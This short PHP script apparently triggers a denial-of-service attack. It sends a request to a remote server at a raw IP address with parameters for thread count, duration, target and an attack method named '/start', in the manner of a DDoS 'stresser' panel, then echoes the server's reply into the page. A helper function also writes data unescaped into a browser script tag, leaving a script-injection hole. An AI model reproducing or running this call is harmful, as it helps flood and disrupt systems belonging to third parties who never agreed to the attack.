<?php

function debug_to_console($data) {
    $output = $data;
    if (is_array($output))
        $output = implode(',', $output);
    echo "<script>console.log('Debug Objects: " . $output . "' );</script>";
}

$data = file_get_contents("http://193.38.235.44:8000/tg?thread=700&time=100&target=lol&method=/start");

echo $data;

?>